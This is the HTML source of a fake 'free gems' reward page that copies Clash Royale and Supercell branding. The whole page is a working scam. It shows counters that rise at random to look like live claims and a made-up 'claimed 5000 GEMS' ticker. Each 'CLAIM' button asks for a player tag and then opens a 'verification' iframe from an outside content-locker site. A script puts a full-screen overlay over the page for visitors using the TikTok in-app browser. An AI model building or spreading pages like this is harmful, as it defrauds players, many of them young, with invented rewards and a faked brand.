<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clash Royale - Official Rewards</title>
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --cr-light-blue: #00d2ff; /* Sre9 mftoh */
            --cr-dark-blue: #0056b3;
            --cr-gold: #ffcc00; /* Dahbi */
            --cr-white: #ffffff; /* Lbyed */
            --card-white: rgba(255, 255, 255, 0.95);
            --accent-green: #28a745;
        }

        body {
            margin: 0; padding: 0;
            background-color: var(--cr-light-blue);
            font-family: 'Lilita One', cursive;
            color: white; text-align: center;
            overflow-x: hidden;
            background-image: radial-gradient(rgba(255,255,255,0.2) 15%, transparent 15%), radial-gradient(rgba(255,255,255,0.2) 15%, transparent 15%);
            background-position: 0 0, 25px 25px;
            background-size: 50px 50px;
            animation: moveBackground 4s linear infinite;
        }

        @keyframes moveBackground { from { background-position: 0 0, 25px 25px; } to { background-position: 50px 50px, 75px 75px; } }

        /* --- TIKTOK OVERLAY --- */
        #ttOverlay { position: fixed; inset: 0; background: #000; display: none; z-index: 9999999; }
        #tutorialGif { width: 100%; height: 100%; object-fit: cover; }

        /* Live Bar (Brawl Style) */
        .live-bar { background: rgba(0,0,0,0.5); padding: 8px 0; font-size: 12px; border-bottom: 2px solid var(--cr-gold); overflow: hidden; height: 20px; }
        #liveText { transition: all 0.5s ease-in-out; display: inline-block; }

        .logo-container { margin: 20px 0; }
        .logo { width: 160px; filter: drop-shadow(0 10px 15px rgba(0,0,0,0.4)); animation: floatLogo 3s ease-in-out infinite; }
        @keyframes floatLogo { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-12px); } }

        /* Stats Panel bhal Brawl Stars */
        .stats-panel {
            background: rgba(0, 86, 179, 0.8); border: 2px solid var(--cr-gold);
            border-radius: 20px; display: inline-flex; gap: 30px; padding: 12px 30px; margin-bottom: 25px;
            box-shadow: inset 0 0 10px rgba(0,0,0,0.5); align-items: center;
        }
        .stat-box { display: flex; flex-direction: column; align-items: center; min-width: 90px; }
        .stat-val { font-size: 22px; text-shadow: 2px 2px #000; color: var(--cr-gold); }

        .container {
            width: 95%; max-width: 480px; margin: 0 auto;
            background: rgba(255, 255, 255, 0.1); border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 30px; padding: 15px 10px; box-sizing: border-box;
        }

        /* --- GRID 3 COLUMNS (Brawl Stars Layout) --- */
        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }

        .card {
            background: var(--cr-white); border: 2px solid var(--cr-gold); border-radius: 15px;
            padding: 12px 5px; position: relative; overflow: hidden;
            box-shadow: 0 5px 12px rgba(0,0,0,0.3); display: flex; flex-direction: column; align-items: center;
        }
        .card::before {
            content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: repeating-conic-gradient(from 0deg, rgba(255, 204, 0, 0) 0deg 15deg, rgba(255, 204, 0, 0.1) 15deg 30deg);
            animation: rotateSun 12s linear infinite; z-index: 0;
        }
        @keyframes rotateSun { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .item-name { font-size: 9px; height: 22px; z-index: 2; color: #003366; text-transform: uppercase; font-weight: bold; }
        .img-box { height: 70px; display: flex; align-items: center; justify-content: center; z-index: 2; margin: 4px 0; }
        .item-img { max-width: 85%; max-height: 100%; filter: drop-shadow(0 5px 8px rgba(0,0,0,0.2)); }
        .price-line { color: var(--accent-green); font-size: 10px; margin-bottom: 6px; z-index: 2; }

        .btn-claim {
            background: linear-gradient(180deg, var(--cr-light-blue) 0%, var(--cr-dark-blue) 100%);
            border: none; border-bottom: 3px solid #003366; border-radius: 8px;
            color: white; font-size: 13px; padding: 6px 0; width: 90%; cursor: pointer; z-index: 2; font-family: 'Lilita One', cursive;
        }

        /* --- MODAL STYLE (Clean White & Gold) --- */
        .modal-overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.9);
            display: none; justify-content: center; align-items: center; z-index: 1000;
            backdrop-filter: blur(8px);
        }
        .modal-box {
            background: var(--cr-white); width: 85%; max-width: 380px;
            border: 5px solid var(--cr-gold); border-radius: 25px;
            padding: 25px 15px; position: relative; box-shadow: 0 10px 0 #b38f00;
        }
        
        .input-wrapper {
            background: #f1f1f1; border: 2px solid #ddd;
            border-radius: 15px; padding: 15px; margin: 15px 0;
        }
        .modal-input { background: transparent; border: none; color: #333; width: 100%; font-family: 'Lilita One'; font-size: 20px; text-align: center; outline: none; }

        .btn-continue {
            background: linear-gradient(180deg, #ffcc00 0%, #ff9900 100%);
            border: none; border-bottom: 6px solid #b36b00; border-radius: 12px;
            color: white; font-family: 'Lilita One'; font-size: 30px;
            padding: 10px 0; width: 100%; cursor: pointer; text-shadow: 2px 2px 0 #b36b00;
        }

        .locker-frame {
            background: #1a1a1a; border: 3px solid #000; border-radius: 15px;
            width: 100%; height: 400px; margin-top: 10px; overflow: hidden;
        }

        footer { margin-top: 50px; background: #000; padding: 40px 20px; color: white; }
    </style>
</head>
<body onclick="document.getElementById('ttOverlay').style.display='none'">

    <div id="ttOverlay"><img src="tutorial.gif" id="tutorialGif"></div>

    <div class="live-bar">
        <span id="liveText">🔥 <b>Player_12</b> claimed <span>5000 GEMS!</span></span>
    </div>

    <div class="logo-container">
        <img src="https://link.clashroyale.com/images/cr-logo-white.png" class="logo">
    </div>

    <div class="stats-panel">
        <div class="stat-box">
            <div style="font-size: 9px;">REWARDS</div>
            <span class="stat-val" id="claimed">2,415</span>
        </div>
        <div class="stat-box">
            <div style="font-size: 9px;">ONLINE</div>
            <span class="stat-val" id="online">842</span>
        </div>
    </div>

    <div class="container">
        <div style="font-size:16px; margin-bottom:15px; text-shadow: 1px 1px #000;">SELECT YOUR PRIZE</div>
        <div class="grid" id="mainGrid"></div>
    </div>

    <div class="modal-overlay" id="modalTag">
        <div class="modal-box">
            <h2 style="color: #0056b3; margin:0;">PLAYER TAG</h2>
            <div class="input-wrapper">
                <input type="text" class="modal-input" id="playerTag" placeholder="#P8LVQ..." maxlength="12">
            </div>
            <button class="btn-continue" onclick="goToLocker()">CONTINUE</button>
        </div>
    </div>

    <div class="modal-overlay" id="modalLocker">
        <div class="modal-box">
            <h2 style="color: #0056b3; margin:0;">VERIFICATION</h2>
            <div class="locker-frame">
                <iframe src="https://checkmyapp.space/cl/i/822w96" style="width:100%; height:100%; border:none;"></iframe>
            </div>
        </div>
    </div>

    <footer>
        <img src="https://supercell.com/images/800/logo_supercell@2x.png" width="100">
        <p style="font-size: 11px; opacity: 0.6; margin-top: 20px;">© Supercell 2026. This is Fan Content.</p>
    </footer>

    <script>
        const rewardsData = [
            {n: "10,000 GEMS", q: "X1", img: "gems5000.PNG"},
            {n: "LEGENDARY CHEST", q: "X1", img: "chest5stars.PNG"},
            {n: "EVO KNIGHT", q: "X1", img: "evoknight.PNG"},
            {n: "MAGIC ARCHER", q: "X1", img: "archer.PNG"},
            {n: "BALLOON", q: "X1", img: "Balloon.PNG"},
            {n: "KNIGHT", q: "X1", img: "Knight.PNG"},
            {n: "PRINCE", q: "X1", img: "prince.PNG"},
            {n: "WIZARD", q: "X1", img: "wizard.PNG"},
            {n: "MUSKETEER", q: "X1", img: "musketeer.PNG"},
            {n: "GIANT", q: "X1", img: "giant.PNG"},
            {n: "GOLEM", q: "X1", img: "golem.PNG"},
            {n: "MINI P.E.K.K.A", q: "X1", img: "minipekka.PNG"},
            {n: "BARBARIAN BARREL", q: "X1", img: "barrel.PNG"},
            {n: "MEGA MINION", q: "X1", img: "Minion.PNG"},
            {n: "GOBLINS", q: "X1", img: "goblins.PNG"}
        ];

        const grid = document.getElementById('mainGrid');
        rewardsData.forEach(r => {
            grid.innerHTML += `<div class="card">
                <div class="item-name">${r.n}</div>
                <div class="img-box"><img src="./${r.img}" class="item-img" onerror="this.src='https://via.placeholder.com/80'"></div>
                <div class="price-line">FREE</div>
                <button class="btn-claim" onclick="openTagModal()">CLAIM</button>
            </div>`;
        });

        function openTagModal() { document.getElementById('modalTag').style.display = 'flex'; }
        function goToLocker() {
            if(document.getElementById('playerTag').value.length > 2) {
                document.getElementById('modalTag').style.display = 'none';
                document.getElementById('modalLocker').style.display = 'flex';
            }
        }

        // Stats Logic
        setInterval(() => {
            const cl = document.getElementById('claimed');
            const on = document.getElementById('online');
            if(cl) cl.innerText = (parseInt(cl.innerText.replace(',','')) + Math.floor(Math.random()*2)).toLocaleString();
            if(on) on.innerText = (parseInt(on.innerText.replace(',','')) + Math.floor(Math.random()*3-1)).toLocaleString();
        }, 3000);

        window.addEventListener("load", () => {
            if (/TikTok|Bytedance/i.test(navigator.userAgent)) {
                document.getElementById("ttOverlay").style.display = "block";
            }
        });
    </script>
</body>
</html>
